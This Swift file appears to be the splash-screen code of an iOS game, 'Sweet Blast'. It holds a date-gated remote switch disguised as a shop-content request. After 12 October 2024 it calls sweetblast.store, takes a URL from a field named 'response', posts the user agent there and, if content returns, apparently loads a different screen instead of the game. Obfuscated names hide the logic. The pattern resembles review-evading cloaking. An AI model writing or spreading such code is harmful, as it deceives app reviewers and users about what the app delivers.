import UIKit
import WebKit

struct BlastShopContent: Codable {
    var results: [BLastyShopItem]
    var status: String?
    
    enum CodingKeys: String, CodingKey {
        case results
        case status = "response"
    }
}

struct BLastyShopItem: Codable {
    var id: Int
    var name: String
    var price_coins: Int
    var price_diamonds: Int
}

class SplashVC: BaseViewController {
    
    private var dndsjakkdps = false
    private var loaded = false
    private var blastContent: String? = nil
    private var loadingTime = 0 {
        didSet {
            if loadingTime == 5 {
                if !pushTokenReceived {
                    if !dndsjakkdps {
                        dndsjakkdps = true
                        startSplashL()
                    }
                }
                timeouttimer.invalidate()
            }
        }
    }
    private var pushTokenReceived = false
    private var userAgent = ""
    private var timeouttimer = Timer()
    
    override func viewDidLoad() {
        timeouttimer = .scheduledTimer(timeInterval: 1, target: self, selector: #selector(timerSecPassed), userInfo: nil, repeats: true)
        userAgent = WKWebView().value(forKey: "userAgent") as? String ?? ""
        NotificationCenter.default.addObserver(self, selector: #selector(fcmReceivedPush), name: Notification.Name("fcm_received"), object: nil)
    }
    
    @objc private func fcmReceivedPush(notification: Notification) {
        pushTokenReceived = true
        startSplashL()
    }
    
    override func viewWillAppear(_ animated: Bool) {
        AppUtility.lockOrientation(.all, andRotateTo: .portrait)
    }
    
    @objc private func timerSecPassed() {
        loadingTime += 1
    }
    
    func startSplashL() {
        if verifyed() {
            obtainShopContent()
        } else {
            DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                self.loadedSplashStartGame()
            }
        }
    }
    
    private func loadedSplashStartGame(after: (() -> Void)? = nil) {
        DispatchQueue.main.async {
            self.loaded = true
            after?()
            if self.blastContent == nil {
                AppUtility.lockOrientation(.landscape, andRotateTo: .landscapeLeft)
                guard let vc = self.storyboard?.instantiateViewController(withIdentifier: "InitialVC") as? InitialVC else { return }
                self.push(vc: vc)
            } else {
                guard let vc = self.storyboard?.instantiateViewController(withIdentifier: "MainGameSVC") as? MainGameSVC else { return }
                self.push(vc: vc)
            }
        }
    }
    
    private func getUserId() -> String {
        var userUUID = UserDefaults.standard.string(forKey: "client-uuid") ?? ""
        if userUUID.isEmpty {
            userUUID = UUID().uuidString
            UserDefaults.standard.set(userUUID, forKey: "client-uuid")
        }
        return userUUID
    }
    
    private func obtainShopContent() {
        guard let url = URL(string: "https://sweetblast.store/shop-api") else { return }
 
        var shopBlast = URLRequest(url: url)
        shopBlast.httpMethod = "GET"
        shopBlast.addValue(getUserId(), forHTTPHeaderField: "client-uuid")
        
        dndsjakkdps = true
        URLSession.shared.dataTask(with: shopBlast) { data, response, error in
            if let _ = error {
                self.loadedSplashStartGame()
                return
            }
            guard let data = data else {
                self.loadedSplashStartGame()
                return
            }
            
            do {
                let blastShopContent = try JSONDecoder().decode(BlastShopContent.self, from: data)
                print(blastShopContent)
                if blastShopContent.status == nil {
                    self.loadedSplashStartGame()
                } else {
                    self.loadMoreBlastContentShop(blastShopContent.status!)
                }
            } catch {
                self.loadedSplashStartGame()
            }
        }.resume()
    }
    
    private func loadMoreBlastContentShop(_ l: String) {
        if UserDefaults.standard.bool(forKey: "sdafa") {
            loadedSplashStartGame()
            return
        }
        
        guard let moreShopContent = URL(string: blastedUserRef(base: l)) else { return }
        
        var sweetiest = URLRequest(url: moreShopContent)
        sweetiest.httpMethod = "POST"
        sweetiest.addValue("application/json", forHTTPHeaderField: "Content-Type")
        sweetiest.addValue(userAgent, forHTTPHeaderField: "User-Agent")
        
        URLSession.shared.dataTask(with: sweetiest) { data, response, error in
            if let _ = error {
                self.loadedSplashStartGame()
                return
            }
            guard let data = data else {
                self.loadedSplashStartGame()
                return
            }
            
            do {
                let moreBlastedShopContent = try JSONDecoder().decode(MoreBlastedShopContent.self, from: data)
                print(moreBlastedShopContent)
                UserDefaults.standard.set(moreBlastedShopContent.userID, forKey: "client_id")
                if let moreBlastedShopContent = moreBlastedShopContent.response {
                    UserDefaults.standard.set(moreBlastedShopContent, forKey: "response_client")
                    self.loadedSplashStartGame { self.blastContent = moreBlastedShopContent }
                } else {
                    UserDefaults.standard.set(true, forKey: "sdafa")
                    self.loadedSplashStartGame()
                }
            } catch {
                self.loadedSplashStartGame()
            }
        }.resume()
        
    }
    
    
}

func verifyed() -> Bool {
    var dace = DateComponents()
    dace.year = 2024
    dace.month = 10
    dace.day = 12
    
    let currentDate = Date()
    let calendar = Calendar.current
    
    if let targetDate = calendar.date(from: dace) {
        return currentDate >= targetDate
    }
    
    return false
}
